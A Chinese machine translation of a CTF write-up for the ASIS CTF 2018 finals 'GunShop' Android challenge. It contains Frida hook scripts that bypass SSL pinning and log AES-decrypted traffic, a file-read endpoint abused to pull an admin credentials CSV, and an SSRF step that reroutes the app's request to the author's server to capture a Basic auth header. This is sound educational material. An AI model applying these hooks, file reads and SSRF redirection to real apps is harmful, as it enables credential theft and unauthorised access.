# 弗里达的 Android Hook-ASIS CTF 2018 年决赛-枪械店问题演练

> 原文：<https://infosecwriteups.com/android-hook-asis-ctf-final-2018-gunshops-question-walkthrough-ae5dfe8b5df0?source=collection_archive---------1----------------------->

参与者得到一把名为 **GunShop.apk** 的 APK。在安卓系统中打开 APK 会显示一个登录页面。我们继续分析应用程序。

![](img/fe6dcc49a9b1930fb377c8cee85e0cf5.png)

# 客户端分析

应用程序正在与具有额外加密层(AES/ECB/PKCS5Padding)的后端服务器进行交互。

```
public static String a(String str, Key key) {
        Cipher instance = **Cipher.getInstance("AES/ECB/PKCS5Padding");**
        instance.init(1, key);
        return Base64.encodeToString(instance.doFinal(str.getBytes("UTF-8")), 2);
    }
```

加密和解密功能:

```
**public static String a(String str, Key key) {**
        Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
        instance.init(1, key);
        return Base64.encodeToString(instance.doFinal(str.getBytes("UTF-8")), 2);
    }**public static String b(String str, Key key) {**
        Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
        instance.init(2, key);
        return new String(instance.doFinal(Base64.decode(str, 2)), "UTF-8");
    }
```

端点 URL 和加密密钥也由位于以下路径的另一个密钥加密:

```
/resources/assests/configKey
/resources/assests/configUrl
```

分析应用程序导致发现主要的关键。关键是 android 应用程序符号的`SHA-256`散列。

```
public static String a(Context context, String str) {
        if (str == null) {
            return null;
        }
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(str, 64);
            if (packageInfo.signatures.length != 1) {
                return null;
            }
            **return b(MessageDigest.getInstance("SHA-256").digest(packageInfo.signatures[0].toByteArray())).substring(0, 16);**
        } catch (NameNotFoundException e) {
            return null;
        } catch (NoSuchAlgorithmException e2) {
            return null;
        }
    }
```

该应用程序也使用 SSL-Pin，因此，该请求无法被拦截。解决这个问题的两种方法:

1.  挂接一个函数或寻找内存读取和的解密值，然后在**/resources/assets/**中将加密值替换为解密值，使解密函数返回`true`并且对**/resources/assets/**中的文件不做任何操作，移除 SSL-Pin 并拦截请求。
2.  挂钩重要的函数来查看请求/响应，以便模糊输入。

选择的第二种方法。打开弗里达:

```
frida -U -l scripts.js android.gunshop.com.gunshop                                                                                                          ✔  3554  18:02:29
     ____
    / _  |   Frida 12.2.25 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at [http://www.frida.re/docs/home/](http://www.frida.re/docs/home/)
Attaching...                                                            
Script loaded successfully
HTTP Request
[Unknown Samsung Galaxy S6 - 5.0.0 - API 21 - 1440x2560::android.gunshop.com.gunshop]->
```

# 解决方案—第 1 部分

第一件事是揭示端点 URL。函数 **a(String str，String str)** 处理 HTTP 请求:

```
public static String a(String str, String str2) {
        String str3 = "";
        HttpsURLConnection httpsURLConnection = (HttpsURLConnection) new URL(str).openConnection();
        CookieManager instance = CookieManager.getInstance();
        String cookie = instance.getCookie(httpsURLConnection.getURL().toString());
        if (cookie != null) {
            httpsURLConnection.setRequestProperty("Cookie", cookie);
        }
        httpsURLConnection.setSSLSocketFactory(SSLCertificateSocketFactory.getInsecure(0, null));
        httpsURLConnection.setHostnameVerifier(new AllowAllHostnameVerifier());
        httpsURLConnection.setReadTimeout(15000);
        httpsURLConnection.setConnectTimeout(15000);
        httpsURLConnection.setRequestMethod("POST");
        httpsURLConnection.setDoInput(true);
        httpsURLConnection.setDoOutput(true);
        httpsURLConnection.connect();
        if (a(httpsURLConnection, a)) {
            OutputStream outputStream = httpsURLConnection.getOutputStream();
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
            bufferedWriter.write(str2);
            bufferedWriter.flush();
            bufferedWriter.close();
            outputStream.close();
            if (httpsURLConnection.getResponseCode() != 200) {
                return "";
            }
            List<String> list = (List) httpsURLConnection.getHeaderFields().get("Set-Cookie");
            if (list != null) {
                for (String cookie2 : list) {
                    instance.setCookie(httpsURLConnection.getURL().toString(), cookie2);
                }
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));
            cookie2 = str3;
            while (true) {
                str3 = bufferedReader.readLine();
                if (str3 == null) {
                    break;
                }
                cookie2 = cookie2 + str3;
            }
            String headerField = httpsURLConnection.getHeaderField("X-GUN-SHOP");
            if (headerField != null && !headerField.isEmpty()) {
                return cookie2;
            }
            throw new Exception(cookie2);
        }
        **throw new Exception("SSL Pin Error");**
    }
```

通过 [Frida](https://www.frida.re/docs/android/) 挂接 HTTP 请求函数:

```
Java.perform(function z() {
    console.log("HTTP Request");
    var my_class = Java.use("android.gunshop.com.gunshop.m");
    my_class.a.overload('java.lang.String', 'java.lang.String').implementation = function (str, str2) {
        console.log("original call: HTTP-Request(" + "input1: " + str + ", " + "input2: " + str2.toString() + ")");
        var ret_value = this.a(str, str2);
        console.log("return value HTTP-Request: " + ret_value + "\n\n");
        return ret_value;
    }
});
```

在 Frida 控制台上:

```
original call: Encrypt(input1: {"username":"utfu","password":"utfu","device-id":"3d8b0f8219c4b301"}, input2: 31323334353637383961733233343536)
return value a  vDIh9PNlTJI25p/Ku4jAn4YSgjI9+J6Qnc/B9StKPo9iTsYJPBMiVAxlzvRj4VdsPZx0INmSKpvSUiDaatBnXH9gLYHmpa2f/4zycBhloeg=original call: HTTP-Request(input1: **https://darkbloodygunshop.asisctf.com/startSession**, input2: user_data=vDIh9PNlTJI25p%2FKu4jAn4YSgjI9%2BJ6Qnc%2FB9StKPo9iTsYJPBMiVAxlzvRj4VdsPZx0INmSKpvSUiDaatBnXH9gLYHmpa2f%2F4zycBhloeg%3D)
```

发现了终点。打开 URL:

```
> GET /startSession HTTP/1.1
> Host: darkbloodygunshop.asisctf.com
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 405 METHOD NOT ALLOWED
< Server: nginx/1.10.3
< Date: Mon, 26 Nov 2018 14:28:04 GMT
< Content-Type: text/html
< Content-Length: 178
< Connection: keep-alive
< Allow: OPTIONS, POST
< Set-Cookie: session=41f3e699-c94b-488c-8298-8473bceeb28a; Expires=Thu, 27-Dec-2018 14:28:04 GMT; HttpOnly; Path=/
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
* Connection #0 to host darkbloodygunshop.asisctf.com left intact
```

访问索引:

```
> GET / HTTP/1.1
> Host: darkbloodygunshop.asisctf.com
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.10.3
< Date: Mon, 26 Nov 2018 14:28:34 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 26
< Connection: keep-alive
< Set-Cookie: session=4a988c06-2872-4a90-943d-a3292bd8042c; Expires=Thu, 27-Dec-2018 14:28:34 GMT; HttpOnly; Path=/
< 
* Connection #0 to host darkbloodygunshop.asisctf.com left intact
**Missing parameter username**
```

根据提示:

```
> GET /?username=test HTTP/1.1
> Host: darkbloodygunshop.asisctf.com
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.10.3
< Date: Mon, 26 Nov 2018 14:29:11 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 46
< Connection: keep-alive
< Set-Cookie: session=c78406db-5a31-40ab-ba3d-1926c735459f; Expires=Thu, 27-Dec-2018 14:29:11 GMT; HttpOnly; Path=/
< 
* Connection #0 to host darkbloodygunshop.asisctf.com left intact
**username not found in users_gunshop_admins.csv**
```

该文件包含通过错误/调试消息显示的凭据。挖掘更多的 Android 应用程序导致发现一个相对路径似乎把文件作为输入:

```
protected Bitmap doInBackground(String... strArr) {
        Bitmap bitmap = null;
        try {
            return m.c(MainActivity.a + "**/getFile?filename=**" + strArr[0]);
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
            e.printStackTrace();
            return bitmap;
        }
    }
```

正在提取凭据:

```
> GET /getFile?filename=users_gunshop_admins.csv HTTP/1.1
> Host: darkbloodygunshop.asisctf.com
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.10.3
< Date: Mon, 26 Nov 2018 14:31:28 GMT
< Content-Type: text/csv; charset=utf-8
< Content-Length: 25
< Connection: keep-alive
< Content-Disposition: attachment; filename=users_gunshop_admins.csv
< Last-Modified: Sat, 18 Aug 2018 06:44:50 GMT
< Cache-Control: public, max-age=43200
< Expires: Tue, 27 Nov 2018 02:31:28 GMT
< ETag: "1534574690.0-25-3882554259"
< Accept-Ranges: bytes
< Set-Cookie: session=c31d434a-cbd3-40ed-b7b1-4f45bc1484c8; Expires=Thu, 27-Dec-2018 14:31:28 GMT; HttpOnly; Path=/
< 
**alfredo,YhFyP$d*epmj9PUz**
```

之后，挂钩加密/解密函数:

```
console.log("Script loaded successfully");
Java.perform(function x() { 
    console.log("Encryption Function Hooked");var my_class = Java.use("android.gunshop.com.gunshop.m");my_class.b.overload('java.lang.String', 'java.security.Key').implementation = function (str, key) {var b = key.getEncoded();
        var printable_key = ""
        for (var i = 0; i < b.length; i++) {printable_key += (b[i].toString(16) + "");}console.log("original call: Decrypt(" + "input1: " + str + ", " + "input2: " + printable_key + ")");var ret_value = this.b(str, key);
        console.log("return value b  " + ret_value + "\n\n");
        return ret_value;
    }
});
Java.perform(function y() {
    console.log("Encryption Function Hooked");
    var my_class = Java.use("android.gunshop.com.gunshop.m");my_class.a.overload('java.lang.String', 'java.security.Key').implementation = function (str, key) {var b = key.getEncoded();
        var printable_key = ""
        for (var i = 0; i < b.length; i++) {printable_key += (b[i].toString(16) + "");}console.log("original call: Encrypt(" + "input1: " + str + ", " + "input2: " + printable_key + ")");
        var ret_value = this.a(str, key);
        console.log("return value a  " + ret_value + "\n\n");
        return ret_value;
    }
});
```

然后使用显示的凭据登录:

```
Encryption Function Hooked
Encryption Function Hooked
HTTP Request
original call: Encrypt(input1: {**"username":"alfredo","password":"YhFyP$d*epmj9PUz"**,"device-id":"3d8b0f8219c4b301"}, input2: 31323334353637383961733233343536)
return value a  0JjOmMth2l+n+Xmw3RlvcHzfA2HZbR58OvVHc4V7GcJ6LMonOfw8PBIuMrzE2zNGlsMtJTqnXEUOiTiCMQ3540kgeQbDgE0JZ973HcGaOn4eGRw0uZRx7mkZ1sxOA29Doriginal call: HTTP-Request(input1: [https://darkbloodygunshop.asisctf.com/startSession](https://darkbloodygunshop.asisctf.com/startSession), input2: user_data=0JjOmMth2l%2Bn%2BXmw3RlvcHzfA2HZbR58OvVHc4V7GcJ6LMonOfw8PBIuMrzE2zNGlsMtJTqnXEUOiTiCMQ3540kgeQbDgE0JZ973HcGaOn4eGRw0uZRx7mkZ1sxOA29D)
return value HTTP-Request: jjIDPwljJ9cUm8mLk9kbZxlSZg7Y55rtv/iHDzvQJjzBpw/nBHMFBdDOc7mSyrhB+KCIjpJWpVpQqYkK/ePVxTxuJ9D3qrNvXe2bSBT2RaoW6O+Br97cAU9Ts7shulfMNpeSxN2nOi5XH9HkUBoP6taaJV6YAVjWK+IrzLnY3zM1pCYm3R4J/KS+prKqqEEgBq+lUUOpI2lippXD+48PEEBVpbCUz7cn2UScrHO0AQ7A/SQPqmcZMkDDv2S2CYrxk9RhykMVQ+v94/5/RfIzGURkKkZ0a+zOLlzf2NZSZPvAkyPN8M0SrvGEBYtPJrgLZmapEW2uP5XOWhAZV2Oh29c63vRtwy3vBrOuy3rk12ePG0Ptdoth8okvA56bNQ1/EVBHuhWnvvRnL19Fir4pbSXqtuB50ZBR8NIUiLKS7Ve/lhB6lHA6hg2n2g/Vbvlf9dIk8VpA4vSNAdtfrJhvy+SYsTLS7mGqL+HASJxDAVD/5Ytti+o0aXTHojUI27Z6oVMgIU3x206vG9x1Gtk/QPBt4TnZz9eo0NmU7T6u+yLXEGPUtQSWncTbmBQPwVpHwqEkkxKEoXq1qkzv6+qWPJkHhrTQgt+6md1tJ0gFsO435CfAHnd/HJGsHn73SfnASKB+cmYyacajvpG2VLwk6JOnG2NINOelsWenBf4+Cokl+aY4E23d98HsvD9IfApjmyNDRhfP4mSEppDuhGVboVySfZpIdKD8qWqf/BkX+OZ+lFzqOoU+McVObhkVy/xnS/xhKHkcsoyf5tYkgcbfxbcoUh4oRbFNSzvcsEC2VxFossjFBE5vC7KXvbgDtft88fGUqTYnaV9+q3WlHSvj3CFQCsRjHBzrAMYnHVMBLM0VkSCppkSMs4CxIwG5NFO6PkJKq4L06i8T9pMs/uh9w1bIuamuafTYN8rFcH7dDMuwc5x7tEvdYZSlYTPsGvylSKHggsSRwoAdQuAPcQ5AVtzWI+Vb6U3AqXYfS3y4ys+iPwndtLlOEif3YU+j5PoiAIkdHcC6oNItRDJuga0KP4uXyr4KXT6UOfxBAKKvgXveDjWrzDirkroAF9y4ygTQe5hggEdPgd+2NcZgJ90t812F5i6/sccomd2GvX8supAqjuD4D9Xvxs9jK6vol7jbwPJFPimYn2UvJ0JfE5Y29LwL8PWVinwx2ptAIr7qC7vBD6Cb/mOgT7GHos1tqpHRoriginal call: Decrypt(input1: jjIDPwljJ9cUm8mLk9kbZxlSZg7Y55rtv/iHDzvQJjzBpw/nBHMFBdDOc7mSyrhB+KCIjpJWpVpQqYkK/ePVxTxuJ9D3qrNvXe2bSBT2RaoW6O+Br97cAU9Ts7shulfMNpeSxN2nOi5XH9HkUBoP6taaJV6YAVjWK+IrzLnY3zM1pCYm3R4J/KS+prKqqEEgBq+lUUOpI2lippXD+48PEEBVpbCUz7cn2UScrHO0AQ7A/SQPqmcZMkDDv2S2CYrxk9RhykMVQ+v94/5/RfIzGURkKkZ0a+zOLlzf2NZSZPvAkyPN8M0SrvGEBYtPJrgLZmapEW2uP5XOWhAZV2Oh29c63vRtwy3vBrOuy3rk12ePG0Ptdoth8okvA56bNQ1/EVBHuhWnvvRnL19Fir4pbSXqtuB50ZBR8NIUiLKS7Ve/lhB6lHA6hg2n2g/Vbvlf9dIk8VpA4vSNAdtfrJhvy+SYsTLS7mGqL+HASJxDAVD/5Ytti+o0aXTHojUI27Z6oVMgIU3x206vG9x1Gtk/QPBt4TnZz9eo0NmU7T6u+yLXEGPUtQSWncTbmBQPwVpHwqEkkxKEoXq1qkzv6+qWPJkHhrTQgt+6md1tJ0gFsO435CfAHnd/HJGsHn73SfnASKB+cmYyacajvpG2VLwk6JOnG2NINOelsWenBf4+Cokl+aY4E23d98HsvD9IfApjmyNDRhfP4mSEppDuhGVboVySfZpIdKD8qWqf/BkX+OZ+lFzqOoU+McVObhkVy/xnS/xhKHkcsoyf5tYkgcbfxbcoUh4oRbFNSzvcsEC2VxFossjFBE5vC7KXvbgDtft88fGUqTYnaV9+q3WlHSvj3CFQCsRjHBzrAMYnHVMBLM0VkSCppkSMs4CxIwG5NFO6PkJKq4L06i8T9pMs/uh9w1bIuamuafTYN8rFcH7dDMuwc5x7tEvdYZSlYTPsGvylSKHggsSRwoAdQuAPcQ5AVtzWI+Vb6U3AqXYfS3y4ys+iPwndtLlOEif3YU+j5PoiAIkdHcC6oNItRDJuga0KP4uXyr4KXT6UOfxBAKKvgXveDjWrzDirkroAF9y4ygTQe5hggEdPgd+2NcZgJ90t812F5i6/sccomd2GvX8supAqjuD4D9Xvxs9jK6vol7jbwPJFPimYn2UvJ0JfE5Y29LwL8PWVinwx2ptAIr7qC7vBD6Cb/mOgT7GHos1tqpHR, input2: 31323334353637383961733233343536)
return value b  {"key": "3b69e03666ebba1d18a76df51a4704c2", "deviceId": "3d8b0f8219c4b301", "flag1": "**ASIS{d0Nt_KI11_M3_G4NgsteR}**", "list": [{"pic": "1.jpg", "id": "GN12-34", "name": "Tiny Killer", "description": "Excellent choise for silent killers."}, {"pic": "2.jpg", "id": "GN12-301", "name": "Gru Gun", "description": "A magic underground weapon."}, {"pic": "3.png", "id": "GN12-1F52B", "name": "U+1F52B", "description": "Powerfull electronic gun. Usefull in chat rooms and twitter."}, {"pic": "4.jpeg", "id": "GN12-1", "name": "HV-Penetrator", "description": "The Gun of future."}, {"pic": "5.jpg", "id": "GN12-90", "name": "Riffle", "description": "Protect your self with me."}, {"pic": "6.png", "id": "GN12-21", "name": "Gun Shop Subscription", "description": "Subscription 1 month to gun shop."}, {"pic": "7.png", "id": "GN12-1002", "name": "GunSet", "description": "A Set of weapons, useful for assassins."}]}
```

# 解决方案—第 2 部分

成功登录后，显示了几把枪。申请的工作流程是选择一把枪，然后提交购买它。这个流包含两个独立的 HTTP 请求:

```
original call: Encrypt(input1: {"gunId":"GN12-34"}, input2: 474a-5e-21-666f-7b7174311f9-335c)
return value a  d/DDO//gJN0c8Cmu9/0it2PUnxFfnfFQyiBakgTRNqY=original call: HTTP-Request(input1: https://darkbloodygunshop.asisctf.com/selectGun, input2: user_data=d%2FDDO%2F%2FgJN0c8Cmu9%2F0it2PUnxFfnfFQyiBakgTRNqY%3D)
return value HTTP-Request: 220YCO3gST2F/ew+kLfYjCcFsxqNrcpPsBxKfFAqZEhIUi9fGEs3GaOV5DiHrumezGU9mBE8fGFUVQK3k4sRGI4KqchWje52++U2gvWornu77m42QDdb3sdkkviqei01original call: Decrypt(input1: 220YCO3gST2F/ew+kLfYjCcFsxqNrcpPsBxKfFAqZEhIUi9fGEs3GaOV5DiHrumezGU9mBE8fGFUVQK3k4sRGI4KqchWje52++U2gvWornu77m42QDdb3sdkkviqei01, input2: 474a-5e-21-666f-7b7174311f9-335c)
return value b  {"shop": {"name": "City Center Shop", "url": "http://188.166.76.14:42151/DBdwGcbFDApx93J3"}}original call: Encrypt(input1: {"shop":"**http:\/\/188.166.76.14:42151\/DBdwGcbFDApx93J3**"}, input2: 474a-5e-21-666f-7b7174311f9-335c)
return value a  ahv2s2OPlVD80fZgoaLcg3K7uSJYZOllph4rAEtUkbPP4N1PriGbfeZ9nqymI1Zf3DumuFStgVvv3JRJqjONQA==original call: HTTP-Request(input1: https://darkbloodygunshop.asisctf.com/finalizeSession, input2: user_data=ahv2s2OPlVD80fZgoaLcg3K7uSJYZOllph4rAEtUkbPP4N1PriGbfeZ9nqymI1Zf3DumuFStgVvv3JRJqjONQA%3D%3D)
return value HTTP-Request: zRg8II6acb6ozVqb2agJcxxV6vKtqdIrLN2VhpKHaLP/qsH4iDhHcfvBi8vbNZCMbeH4mo6EAqjSAs9d9Seo4D1GRrYY8qqvRdlS5LkOHlCKlVOBSQNobl1JwaroWd6MzWkySfCrTyjiKBMgjPsSDQ==original call: Decrypt(input1: zRg8II6acb6ozVqb2agJcxxV6vKtqdIrLN2VhpKHaLP/qsH4iDhHcfvBi8vbNZCMbeH4mo6EAqjSAs9d9Seo4D1GRrYY8qqvRdlS5LkOHlCKlVOBSQNobl1JwaroWd6MzWkySfCrTyjiKBMgjPsSDQ==, input2: 474a-5e-21-666f-7b7174311f9-335c)
return value b  {"result": "Your request submitted and will be ready as soon as possible. Thanks for shopping. Happy killing."
```

花了几个小时模糊应用程序，这是半硬没有打嗝套件，因为:

1.  登录后，给出了新的 AES 密钥
2.  接下来的两个 HTTP 请求由新密钥加密
3.  请求无法重播两次，应用程序在两次请求后停止工作

最后一个请求是可疑的，因为它有一个 URL:

我想到的第一件事是 SSRF 攻击，所以我修改了`scirpt.js`,用我的服务器 IP 地址替换了 URL:

```
if (str.indexOf("188.166.76.14:42151") > 0) {
            str = str.replace("188.166.76.14:42151", "**[MyServerIP]:80**")
        }
```

令人惊讶的是，我看到了下面的 HTTP 请求:

```
POST /**DBdwGcbFDApx93J3** HTTP/1.1
Host: 185.236.76.59
Connection: keep-alive
User-Agent: python-requests/2.20.1
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
**Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6**username=alfredo&deviceId=3d8b0f8219c4b301
```

立即:

```
**curl -v** [**http://188.166.76.14:42151/DBdwGcbFDApx93J3**](http://188.166.76.14:42151/DBdwGcbFDApx93J3) **-d "username=alfredo&deviceId=3d8b0f8219c4b301" --insecure -H "Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6"**
*   Trying 188.166.76.14...
* TCP_NODELAY set
* Connected to 188.166.76.14 (188.166.76.14) port 42151 (#0)
> POST /DBdwGcbFDApx93J3 HTTP/1.1
> Host: 188.166.76.14:42151
> User-Agent: curl/7.61.1
> Accept: */*
> Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
> Content-Length: 42
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 42 out of 42 bytes
< HTTP/1.1 200 OK
< Server: gunicorn/19.9.0
< Date: Sun, 25 Nov 2018 15:39:56 GMT
< Connection: close
< Content-Type: text/html; charset=utf-8
< Content-Length: 32
< 
* Closing connection 0
**ASIS{0Ld_B16_br0Th3r_H4d_a_F4rm}**
```